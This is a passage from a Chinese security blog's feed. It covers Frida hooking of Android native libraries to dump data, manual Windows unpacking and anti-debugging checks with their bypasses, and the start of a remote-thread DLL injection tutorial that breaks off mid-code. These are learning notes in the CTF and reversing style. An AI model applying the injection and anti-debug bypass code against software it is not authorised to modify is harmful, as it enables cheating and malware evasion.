class="line"><span class="comment">//此函数接收一个指针，一般指向hook函数</span></span><br><span class="line">Interceptor.attach( Module.findExportByName(<span class="string">&#x27;your_so.so&#x27;</span>,<span class="string">&#x27;FuncName&#x27;</span>),<span class="comment">//根据so文件名和函数名通过Export找</span></span><br><span class="line">                  <span class="comment">//第二个参数是回调函数</span></span><br><span class="line">                   &#123;</span><br><span class="line">    <span class="comment">//函数开始时</span></span><br><span class="line">    <span class="function"><span class="title">onEnter</span>(<span class="params">args</span>)</span>&#123;</span><br><span class="line">                            <span class="keyword">let</span> size = args[<span class="number">2</span>].add(<span class="number">0x4</span>).readu32()<span class="comment">//args[2]也就是函数的第三个参数，加4得到结构体地址第二个字段地址</span></span><br><span class="line">                            <span class="comment">//将内容当作指针读取，再读取真实的结构体数据</span></span><br><span class="line">                            <span class="keyword">let</span> data = args[<span class="number">2</span>].readPointer().readByteArray(size)</span><br><span class="line">                            </span><br><span class="line">                           <span class="built_in">console</span>.log(data)<span class="comment">//打印data</span></span><br><span class="line">                        &#125;,</span><br><span class="line">    <span class="comment">//函数结束时,参数为返回值</span></span><br><span class="line">    <span class="function"><span class="title">onLeave</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">                            </span><br><span class="line">                        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">                  )</span><br></pre></td></tr></table></figure><p>此时直接跑是会报错的，因为正如前面所述，在程序开始运行的时候就直接去寻找模块了，但是因为so还没有动态地链接，所以找不到，会得到一个null指针；</p><p>此时的解决思路是：找到加载此so文件的函数，先去hook掉java层的 LoadLibrary，再对比此时传入 LoadLibrary 参数是否是目标so文件，如果是，则再实现上面的代码，如果不是，则实现原函数代码内容；</p><p>通过java层的源码分析可以知道：LoadLibrary 的实现是 调用了一个 LoadLibrary0(a1,a2,a3)去实现主要代码的，而主要代码的逻辑是：<strong>如果传入的字符串是存在的so文件，那么就会直接在其中调用 nativeLoad 函数</strong>；</p><p>而 nativeload 函数也会层层调用，最后会找到一个三参的 nativeload，原型如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">nativeLoad</span><span class="params">(String filename, ClassLoader loader, Class&lt;?&gt; caller)</span></span>;</span><br></pre></td></tr></table></figure><p>此时需要hook的函数，也就是这上面这个了；</p><p>主要代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//因为hook java层，所以用java.use，上述目标函数在runtime里</span></span><br><span class="line"><span class="keyword">const</span> runtimeClass = Java.use(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)</span><br><span class="line"><span class="comment">//hook目标函数</span></span><br><span class="line">runtimeClass.nativeLoad.overload(<span class="string">&#x27;java.lang.String&#x27;</span>,<span class="string">&#x27;java.lang.ClassLoader&#x27;</span>,<span class="string">&#x27;java.lang.Class&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p1,p2,p3</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//调用一次原函数，使得so文件被装载</span></span><br><span class="line">    <span class="keyword">let</span> res = <span class="built_in">this</span>.nativeLoad(p1,p2,p3)</span><br><span class="line">    <span class="comment">//查找第一个参数里是否带目标so文件的路径字符串</span></span><br><span class="line">    <span class="keyword">if</span>(p1.indexOf(<span class="string">&#x27;your_so.so&#x27;</span>) != -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//hook so层实现</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想要将想要的data数据dump出，可以用以下代码(frida提供)：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//路径 + 大小 + 后缀名 (总名称)</span></span><br><span class="line"><span class="keyword">let</span> file = <span class="keyword">new</span> File(<span class="string">&#x27;/sdcard/&#x27;</span> + size + <span class="string">&#x27;.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(data)</span><br><span class="line">file.flush()</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">const</span> runtimeClass = Java.use(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)</span><br><span class="line"><span class="comment">//hook java层加载so的函数</span></span><br><span class="line">runtimeClass.nativeLoad.overload(<span class="string">&#x27;java.lang.String&#x27;</span>,<span class="string">&#x27;java.lang.ClassLoader&#x27;</span>,<span class="string">&#x27;java.lang.Class&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p1,p2,p3</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> res = <span class="built_in">this</span>.nativeLoad(p1,p2,p3)</span><br><span class="line">    <span class="comment">//找到</span></span><br><span class="line">    <span class="keyword">if</span>(p1.indexOf(<span class="string">&#x27;your_so.so&#x27;</span>) != -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//hook so层函数</span></span><br><span class="line">            Interceptor.attach( Module.findExportByName(<span class="string">&#x27;your_so.so&#x27;</span>,<span class="string">&#x27;FuncName&#x27;</span>),</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="function"><span class="title">onEnter</span>(<span class="params">args</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">let</span> size = args[<span class="number">2</span>].add(<span class="number">0x4</span>).readu32()</span><br><span class="line">                <span class="keyword">let</span> data = args[<span class="number">2</span>].readPointer().readByteArray(size)</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">let</span> file = <span class="keyword">new</span> File(<span class="string">&#x27;/sdcard/&#x27;</span> + size + <span class="string">&#x27;.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">                file.write(data)</span><br><span class="line">                file.flush()</span><br><span class="line">                file.close()</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="function"><span class="title">onLeave</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>第二种找到so内目标函数的方法是，没有export的情况，需要用偏移量来进行寻址,在attach函数调用的那一步，改写为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> so = Process.findModuleByName(<span class="string">&#x27;your_so.so&#x27;</span>)</span><br><span class="line">Interceptor.attach( so.add(offset) &#123;<span class="comment">/*回调内容*/</span>&#125;)</span><br></pre></td></tr></table></figure><p>在IDA逆so的时候，设置segement为0，可以定位函数的地址直接为偏移量；</p><p>arm汇编中，函数传参使用r0~r4；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;下载安装和简要说明&quot;&gt;&lt;a href=&quot;#下载安装和简要说明&quot; class=&quot;headerlink&quot; title=&quot;下载安装和简要说明&quot;&gt;&lt;/a&gt;下载安装和简要说明&lt;/h2&gt;&lt;p&gt;下载：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext</summary>
      
    
    
    
    <category term="Diary" scheme="https://secondbc.github.io/SecondBC/categories/Diary/"/>
    
    
    <category term="Bin" scheme="https://secondbc.github.io/SecondBC/tags/Bin/"/>
    
  </entry>
  
  <entry>
    <title>Windows逆向之脱壳与反调试 基础</title>
    <link href="https://secondbc.github.io/SecondBC/2023/03/16/Windows%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%9F%BA%E7%A1%80/"/>
    <id>https://secondbc.github.io/SecondBC/2023/03/16/Windows%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%9F%BA%E7%A1%80/</id>
    <published>2023-03-16T13:13:50.000Z</published>
    <updated>2023-03-16T13:14:48.814Z</updated>
    
    <content type="html"><![CDATA[<p>详细请见 <a href="https://ctf-wiki.org/reverse/introduction/">wiki</a> ；</p><h2 id="壳"><a href="#壳" class="headerlink" title="壳"></a>壳</h2><p>之前已经讲过其概念；这里更多的是脱壳的一些技巧，记录练手；</p><p>更多术语名词在之前提及过；</p><h3 id="单步跟踪法"><a href="#单步跟踪法" class="headerlink" title="单步跟踪法"></a>单步跟踪法</h3><blockquote><p>单步跟踪法的原理就是通过步过 (F8), 步入(F7) 和运行到 (F4) 功能, 完整走过程序的自脱壳过程, 跳过一些循环恢复代码的片段, 并用单步进入确保程序不会略过 OEP. 这样可以在软件自动脱壳模块运行完毕后, 到达 OEP, 并 dump 程序.</p></blockquote><p>要点： </p><ol><li>打开程序按 F8 单步向下, 尽量实现向下的 jmp 跳转；</li><li>会经常遇到大的循环, 这时要多用 F4 来跳过循环；</li><li>如果函数载入时不远处就是一个 call(<strong>近 call</strong>), 那么我们尽量不要直接跳过, 而是进入这个 call；</li><li>一般<strong>跳转幅度大</strong>的 jmp 指令, 都极有可能是跳转到了原程序入口点 (OEP)；</li></ol><p>用题举例：</p><p>打开后即是一个加壳文件，并有着 pusha 指令；</p><p>直接挂在开始处启动调试；</p><p>像图一的这种call就叫近call（基本上这个函数里只有几句话加1个call）；</p><p>中间图的内容是跟进到找不到近call后可以看到这一系列的call在调用windows api，什么Module，ProcAddress一类的；</p><p>再往下走就能进入一个解码循环中，最后的通路在经过一番绕之后发现在 40D15F 这个地址；</p><p><img src="https://s2.loli.net/2023/03/14/D7FTufLkgnNtZ3z.png" alt="debug"></p><p>继续往下走.. 之后还会有些循环，在这些循环中，向下跳的指令如果没有判断执行，很可能就是这条路，如左图所示；</p><p>跳过之后能发现 popa 指令，这与 pusha 相对应，回复其寄存器状态；</p><p>跳转到对应函数后，有push指令和retn，意思是将该十六进制内容压入栈中，并利用这个数据，返回到此十六进制地址；这便是此程序的OEP（从D000变到1000，跳转很明显）；</p><p><img src="https://s2.loli.net/2023/03/14/oKHNXcAEaP5ZCvG.png" alt="find"></p><h3 id="ESP定律法"><a href="#ESP定律法" class="headerlink" title="ESP定律法"></a>ESP定律法</h3><blockquote><p>ESP 定律的原理在于利用程序中堆栈平衡来快速找到 OEP.</p><p>由于在程序自解密或者自解压过程中, 不少壳会先将当前寄存器状态压栈, 如使用<code>pushad</code>, 在解压结束后, 会将之前的寄存器值出栈, 如使用<code>popad</code>. 因此在寄存器出栈时, 往往程序代码被恢复, 此时硬件断点触发. 然后在程序当前位置, 只需要少许单步操作, 就很容易到达正确的 OEP 位置.</p></blockquote><p>简单来讲，在执行 pushad 之后， esp会确定下来，在 popad 执行后，也是此时的esp值，在此时esp栈上打个内存断点，则可检测两次esp同值时的时刻，第二次便是 popad 执行时；</p><p>要点：</p><ol><li>程序刚载入开始 pushad/pushfd；</li><li>将全部寄存器压栈后就设<strong>对 ESP 寄存器设硬件断点</strong>；</li><li>运行程序, 触发断点；</li><li>删除硬件断点开始分析；</li></ol><p>用题举例：</p><p>还是之前的那个程序：</p><p><img src="https://s2.loli.net/2023/03/14/Aek98FthWrYKmHs.png" alt="breakpoint"></p><p>执行后打开此时esp的栈中位置，打上断点，F4执行，会弹出一个硬件断点被捕获的窗口，点击后可以看到来到了上次 popa 执行之后的地方；</p><p>这个方法非常好用；</p><h3 id="一步到达OEP法"><a href="#一步到达OEP法" class="headerlink" title="一步到达OEP法"></a>一步到达OEP法</h3><p>说白了就是搜索 text 为 popad 之类的东西，然后查看其结构是不是壳的转到OEP位置的地方，然后直接在这个地方断点，直接过去；</p><p>只能说，能用的壳比较有限；一般 转到OEP处的 jmp 指令 跳转会比较大；</p><h3 id="内存dump"><a href="#内存dump" class="headerlink" title="内存dump"></a>内存dump</h3><p>找到OEP后，即可dump出脱壳后的程序：</p><p>点击 IDA 的 file &gt; script command &gt; 写入脚本并用 IDC 运行；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> fp, begin, end, dexbyte;</span><br><span class="line">  fp = fopen(<span class="string">&quot;your\\dumped\\file\\path&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  begin = r0;<span class="comment">//OEP位置</span></span><br><span class="line">  end = r0 + r1;<span class="comment">//r1为大小，一般填90000</span></span><br><span class="line">  <span class="keyword">for</span> ( dexbyte = begin; dexbyte &lt; end; dexbyte ++ )</span><br><span class="line">      fputc(Byte(dexbyte), fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>wiki上基本上都是说明，实际操作会来的更少，不过能了解一下，也能为后期搞反调试带来些许帮助；</p><h3 id="NtGlobalFlag"><a href="#NtGlobalFlag" class="headerlink" title="NtGlobalFlag"></a>NtGlobalFlag</h3><p>原理：</p><p>在 32 位机器上, <code>NtGlobalFlag</code>字段位于<code>PEB</code>(进程环境块)<code>0x68</code>的偏移处, 64 位机器则是在偏移<code>0xBC</code>位置. 该字段的默认值为 0. 当调试器正在运行时, 该字段会被设置为一个特定的值，一般是0x70；</p><p>该字段包含有一系列的标志位. 由调试器创建的进程会设置以下标志位:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FLG_HEAP_ENABLE_TAIL_CHECK (0x10)</span><br><span class="line">FLG_HEAP_ENABLE_FREE_CHECK (0x20)</span><br><span class="line">FLG_HEAP_VALIDATE_PARAMETERS (0x40)</span><br></pre></td></tr></table></figure><p>检测其值就能判断是否处于调试中；</p><p>PEB结构在汇编中加入的形式是经典的 fs:30h 段寄存器偏移；</p><p>这时候在PEB结构上往下偏移并找到 NtGlobalFlag；</p><p>之后检测；</p><p>如下为32位系统的 debug 检测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax, fs:[30h] ;Process Environment Block</span><br><span class="line">mov al, [eax+68h] ;NtGlobalFlag</span><br><span class="line">and al, 70h</span><br><span class="line">cmp al, 70h</span><br><span class="line">je being_debugged</span><br></pre></td></tr></table></figure><p>64位中， PEB结构加入形式是 gs:lodsq，也是加到eax寄存器中；</p><p>绕过的核心思想：</p><p>在eip指向 <code>mov al, [eax+68h]</code> 找到其内存位置并重新修改其值为 0.</p><p>对于修改 NtGlobalFlag 初值可以用注册表，这里不详细说明；</p><h3 id="Heap-Flags"><a href="#Heap-Flags" class="headerlink" title="Heap Flags"></a>Heap Flags</h3><p><code>Heap flags</code>包含有两个与<code>NtGlobalFlag</code>一起初始化的标志: <code>Flags</code>和<code>ForceFlags</code>. 这两个字段的值不仅会受调试器的影响, 还会由 windows 版本而不同, 字段的位置也取决于 windows 的版本.</p><blockquote><ul><li>Flags 字段:<ul><li>在 32 位 Windows NT, Windows 2000 和 Windows XP 中, <code>Flags</code>位于堆的<code>0x0C</code>偏移处. 在 32 位 Windows Vista 及更新的系统中, 它位于<code>0x40</code>偏移处.</li><li>在 64 位 Windows XP 中, <code>Flags</code>字段位于堆的<code>0x14</code>偏移处, 而在 64 位 Windows Vista 及更新的系统中, 它则是位于<code>0x70</code>偏移处.</li></ul></li><li>ForceFlags 字段:<ul><li>在 32 位 Windows NT, Windows 2000 和 Windows XP 中, <code>ForceFlags</code>位于堆的<code>0x10</code>偏移处. 在 32 位 Windows Vista 及更新的系统中, 它位于<code>0x44</code>偏移处.</li><li>在 64 位 Windows XP 中, <code>ForceFlags</code>字段位于堆的<code>0x18</code>偏移处, 而在 64 位 Windows Vista 及更新的系统中, 它则是位于<code>0x74</code>偏移处.</li></ul></li></ul></blockquote><p>一般而言，NtGlobalFlag 设置后，Heap Flags 也会设置；</p><p>调试器存在则：</p><p>Flags字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HEAP_GROWABLE (2)</span><br><span class="line">HEAP_TAIL_CHECKING_ENABLED (0x20)</span><br><span class="line">HEAP_FREE_CHECKING_ENABLED (0x40)</span><br><span class="line">HEAP_SKIP_VALIDATION_CHECKS (0x10000000)</span><br><span class="line">HEAP_VALIDATE_PARAMETERS_ENABLED (0x40000000)</span><br></pre></td></tr></table></figure><p>ForgeFlags：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HEAP_TAIL_CHECKING_ENABLED (0x20)</span><br><span class="line">HEAP_FREE_CHECKING_ENABLED (0x40)</span><br><span class="line">HEAP_VALIDATE_PARAMETERS_ENABLED (0x40000000)</span><br></pre></td></tr></table></figure><h4 id="获取heap位置："><a href="#获取heap位置：" class="headerlink" title="获取heap位置："></a>获取heap位置：</h4><p>kernel32中的 GetProcessHeap()；</p><p>PEB结构中查找，同样，一般动用fs，gs段寄存器就很容易是搞PEB的；</p><h3 id="The-Heap"><a href="#The-Heap" class="headerlink" title="The Heap"></a>The Heap</h3><p>堆在初始化时，会检查 heap flags；</p><p>设置 tail checking enable （尾部检测），那么会分配 0xABABABAB 给堆块尾；</p><p>设置 free checking enbale  ，那么当需要额外字节填充堆块，会用 0xFEEEFEEE；</p><p>那么检测这些字节，可以得知是否在被调试，避免了动PEB的经典形象；</p><p>首先要先知道堆指针，且现代程序堆都会加密；</p><h3 id="Int-3"><a href="#Int-3" class="headerlink" title="Int 3"></a>Int 3</h3><p>无论何时触发了一个软件中断异常, 异常地址以及 EIP 寄存器的值都会同时指向产生异常的下一句指令. 但断点异常是其中的一个特例.</p><p>当<code>EXCEPTION_BREAKPOINT(0x80000003)</code>异常触发时, Windows 会认定这是由单字节的 “<code>CC</code>“ 操作码 (也即<code>Int 3</code>指令) 造成的. Windows 递减异常地址以指向所认定的 “<code>CC</code>“ 操作码, 随后传递该异常给异常处理句柄. 但是 EIP 寄存器的值并不会发生变化.</p><p>因此, 如果使用了 <code>CD 03</code>（这是 <code>Int 03</code> 的机器码表示），那么当异常处理句柄接受控制时, 异常地址是指向 <code>03</code> 的位置.</p><h3 id="IsDebuggerPresent"><a href="#IsDebuggerPresent" class="headerlink" title="IsDebuggerPresent"></a>IsDebuggerPresent</h3><p>这个是典中典；</p><p>没调试的时候，返回的就是0；</p><p>实际上这个函数只是返回了 BeingDebugged 标志的值，也是PEB结构中的内容；</p><p>绕过：hook函数，或者改PEB表；</p><h3 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h3><p>存在于kernel32中，检测指定的进程的调试状态；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">CheckRemoteDebuggerPresent</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_    HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  _Inout_ PBOOL  pbDebuggerPresent</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>在被调试的时候，会将第二个参数指向的值变为0xffffffff；</p><p>简单的绕过只是将第二个参数的值在执行该函数后改变为0；</p><p>而这个函数本质是在对NtQueryInformationProcess的使用；</p><h3 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a>NtQueryInformationProcess</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">NtQueryInformationProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_      HANDLE           ProcessHandle,<span class="comment">//进程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  _In_      PROCESSINFOCLASS ProcessInformationClass,<span class="comment">//信息类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">  _Out_     PVOID            ProcessInformation,<span class="comment">//写入信息缓冲区</span></span></span></span><br><span class="line"><span class="params"><span class="function">  _In_      ULONG            ProcessInformationLength,<span class="comment">//缓冲区大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">  _Out_opt_ PULONG           ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>在第二个参数中，有一个信息类型叫做： ProcessDebugPort；宏为7；</p><p>此时该函数通过查询<code>EPROCESS</code>结构体的<code>DebugPort</code>字段, 当进程正在被调试时, 返回值为<code>0xffffffff</code>；</p><h3 id="ZwSetInformationThread"><a href="#ZwSetInformationThread" class="headerlink" title="ZwSetInformationThread"></a>ZwSetInformationThread</h3><p>这个函数给线程设置信息，可以设置：ThreadHideFromDebugger，禁止线程调试；</p><p>处于调试状态，执行完：<code>ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, 0, 0)</code> ，程序就会退出；</p><p>绕过：</p><p>ThreadHideFromDebugger，宏为0x11，如果看见这个函数，且有参数0x11，改之即可；</p><h3 id="练习题："><a href="#练习题：" class="headerlink" title="练习题："></a>练习题：</h3><p>一开始让输入password，进IDA之后就发现，密码就是很简单的 “I have a pen.”，在原程序里输入确实输出了 “correct”；但后面为何有这么多调试检测？这说明这道题的flag是需要通过调试查找的；</p><p>首先的关卡是 IsDebuggerPresent() ，以及NtGlobalFlag；</p><p><img src="https://s2.loli.net/2023/03/16/d9iOenU4oTr8twJ.png" alt="first"></p><p>简单的对策便是 patch 右上图 1 为 0，右下图 70h 为 2 * 70h；</p><p>接下来遇到的是查看进程调试以及时间差；</p><p><img src="https://s2.loli.net/2023/03/16/m3aAUywoL9dJbTi.png" alt="second"></p><p>首先改写 jz 为 jnz；</p><p>之后GetTickCount返回一个距离程序开始的时间，中间的图是一个sleep循环；最后比较1000；</p><p>这里只需简单粗暴改jbe为jmp；</p><p>接下来就是判断 process monitor 以及进程名，和是否虚拟机；</p><p>具体思想也是改值；</p><p>真实题里，这些反调试函数大大小小也是会比较的，但会有混淆，或者藏于线程，TLS等中去，更难发现；</p><p>而一般的题，确实大可不必去hook API，除非是线程里循环检测的反调试，一开就G的那种，但其实也可以静态patch；</p><p>还有那种判断过后卡几个call再G的反调试，真真的恶心人；</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>熟悉了下手脱壳以及ida的 dump内存；熟悉硬件断点的使用；知晓一些简单的反调试原理；</p><p>感觉反调试原理大多与 PEB 结构有关系；所以接下来会考虑 开坑 PEB；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;详细请见 &lt;a href=&quot;https://ctf-wiki.org/reverse/introduction/&quot;&gt;wiki&lt;/a&gt; ；&lt;/p&gt;
&lt;h2 id=&quot;壳&quot;&gt;&lt;a href=&quot;#壳&quot; class=&quot;headerlink&quot; title=&quot;壳&quot;&gt;&lt;/a&gt;壳&lt;/h2&gt;&lt;</summary>
      
    
    
    
    <category term="Diary" scheme="https://secondbc.github.io/SecondBC/categories/Diary/"/>
    
    
    <category term="Reverse" scheme="https://secondbc.github.io/SecondBC/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>DLL注入与HOOK</title>
    <link href="https://secondbc.github.io/SecondBC/2022/12/12/DLL%E6%B3%A8%E5%85%A5%E4%B8%8EHOOK/"/>
    <id>https://secondbc.github.io/SecondBC/2022/12/12/DLL%E6%B3%A8%E5%85%A5%E4%B8%8EHOOK/</id>
    <published>2022-12-12T14:13:24.000Z</published>
    <updated>2022-12-12T14:19:20.752Z</updated>
    
    <content type="html"><![CDATA[<p>首先啊，首先啊；</p><p>你得了解windows编程及其基于消息的处理机制，DllMain函数；</p><p>不然就会看不懂或者啃着异常难受核心原理第三章；</p><h2 id="dll注入"><a href="#dll注入" class="headerlink" title="dll注入"></a>dll注入</h2><p>dll为文件后缀名，称为dynamic link library，动态链接库，一般用于存储方法和函数，进程运行时动态地调用其函数；</p><p>其显示调用命令为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">LoadLibrary</span>(<span class="string">&quot;.//your//dll&#x27;s//path&quot;</span>);</span><br></pre></td></tr></table></figure><p>dll注入，顾名思义，将已有进程，使其调用不属于它本身的dll文件，称为dll注入；</p><p>一般用于对已经做好的软件进行升级扩展和修补漏洞，也可用于外挂；</p><h3 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h3><p>根据dll注入的本意，很轻易的可以想到通过创建远程进程的子线程对其进行 LoadLibrary 操作；</p><p>利用windows API，于是有以下操作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打开进程</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建进程中的线程</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, ThreadProc, dll_path, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>其中，ThreadProc 是线程回调函数，也就是线程内容，可以在其中执行 LoadLibrary；</p><p>但由于其特殊性，该回调函数的特征类似于LoadLibrary函数，都只有一个参数，而且类型可以说是一样的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//回调</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_ LPVOID lpParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//LoadLibrary</span></span><br><span class="line"><span class="function">HMODULE <span class="title">LoadLibraryA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCSTR lpLibFileName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>所以创建线程可以写成如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, dll_path, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>但有个问题？这里的dll_path传参数是本进程的地址，如果直接这么用，那么目标进程执行时，就会造成调用越界出错；</p><p>所以需要dll_path写入目标进程，用windows API 实现：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 